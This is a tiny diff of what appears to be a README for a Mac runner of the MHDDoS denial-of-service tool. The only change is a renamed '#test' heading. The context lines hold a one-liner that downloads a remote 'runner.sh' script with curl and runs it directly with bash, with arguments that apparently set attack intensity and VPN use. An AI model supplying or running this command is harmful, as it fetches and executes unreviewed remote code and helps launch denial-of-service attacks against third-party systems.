@@ -49,4 +49,4 @@ cd ~
 curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 2500 2000 --debug --vpn
 ```
 
-#test1
+#test
